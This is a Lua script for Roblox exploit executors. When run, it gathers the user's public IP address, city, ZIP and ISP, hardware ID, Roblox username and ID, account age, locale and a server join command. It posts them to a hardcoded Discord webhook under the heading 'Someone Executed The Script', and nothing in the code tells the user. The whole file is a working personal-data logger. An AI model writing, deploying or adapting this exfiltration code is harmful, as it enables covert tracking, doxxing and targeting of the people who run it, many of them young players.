local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local LocalPlayer = Players.LocalPlayer
local webhook = "https://discord.com/api/webhooks/1538937860659486752/wIKq7L0WYzITDSPM-GwVef2CqJY2PBp_yegJ2kWy5IRYrZaVwY2DvQY04vzGmKzy_jdp"
local function httpGet(url)
	local ok, body = pcall(function()
		if syn and syn.request then
			return syn.request({Url = url, Method = "GET"}).Body
		end
		if request then
			return request({Url = url, Method = "GET"}).Body
		end
		if http_request then
			return http_request({Url = url, Method = "GET"}).Body
		end
		return game:HttpGet(url)
	end)
	return ok and body or nil
end

local function post(url, payload)
	local body = HttpService:JSONEncode(payload)
	pcall(function()
		if syn and syn.request then
			syn.request({
				Url = url,
				Method = "POST",
				Headers = {["content-type"] = "application/json"},
				Body = body,
			})
			return
		end
		if request then
			request({
				Url = url,
				Method = "POST",
				Headers = {["content-type"] = "application/json"},
				Body = body,
			})
			return
		end
		if http_request then
			http_request({
				Url = url,
				Method = "POST",
				Headers = {["content-type"] = "application/json"},
				Body = body,
			})
			return
		end
		game:HttpPost(url, body)
	end)
end

local function getExecutor()
	if identifyexecutor then
		local ok, name = pcall(identifyexecutor)
		if ok and name then
			return tostring(name)
		end
	end
	if syn then
		return "Synapse X"
	end
	if KRNL_LOADED then
		return "Krnl"
	end
	if is_sirhurt_closure or pebc_execute then
		return "SirHurt"
	end
	if secure_load then
		return "Sentinel"
	end
	if ProtoSmasher then
		return "ProtoSmasher"
	end
	if Potassium then
		return "Potassium"
	end
	if Xeno then
		return "Xeno"
	end
	return "Shitty Exploit"
end

local function getHwid()
	local ok, id = pcall(function()
		return RbxAnalyticsService:GetClientId()
	end)
	return ok and tostring(id) or "N/A"
end

local function getPlaceName()
	local ok, info = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	if ok and info then
		return info.Name
	end
	return tostring(game.PlaceId)
end

local ip = httpGet("https://v4.ident.me/") or "N/A"
local geo = {}
do
	local raw = httpGet("http://ip-api.com/json")
	if raw then
		pcall(function()
			geo = HttpService:JSONDecode(raw)
		end)
	end
end

local country = table.concat({
	geo.country or "?",
	geo.regionName or "?",
	geo.city or "?",
	geo.zip or "?",
	geo.isp or "?",
	geo.org or "?",
	geo.as or "?",
}, " / ")

local locale = "N/A"
pcall(function()
	locale = LocalizationService.RobloxLocaleId
end)

post(webhook, {
	avatar_url = "https://i.imgur.com/oBPXx0D.png",
	content = "",
	embeds = {
		{
			author = {
				name = "( Someone Executed The Script )",
				url = "https://roblox.com",
			},
			description = table.concat({
				"__[Player Info](https://www.roblox.com/users/" .. LocalPlayer.UserId .. ")__",
				"**Display Name:** " .. LocalPlayer.DisplayName,
				"**Username:** " .. LocalPlayer.Name,
				"**User Id:** " .. tostring(LocalPlayer.UserId),
				"**MembershipType:** " .. tostring(LocalPlayer.MembershipType),
				"**AccountAge:** " .. tostring(LocalPlayer.AccountAge),
				"**Country:** " .. country,
				"**Locale:** " .. tostring(locale),
				"**IP:** " .. tostring(ip),
				"**Hwid:** " .. getHwid(),
				"**Date:** " .. os.date("%m/%d/%Y"),
				"**Time:** " .. os.date("%H:%M:%S"),
				"",
				"**Place:** " .. getPlaceName(),
				"**Executor:** " .. getExecutor(),
				"**Join:** Roblox.GameLauncher.joinGameInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\")",
			}, "\n"),
			type = "rich",
			color = 16711680,
			thumbnail = {
				url = "https://www.roblox.com/headshot-thumbnail/image?userId="
					.. tostring(LocalPlayer.UserId)
					.. "&width=150&height=150&format=png",
			},
		},
	},
})
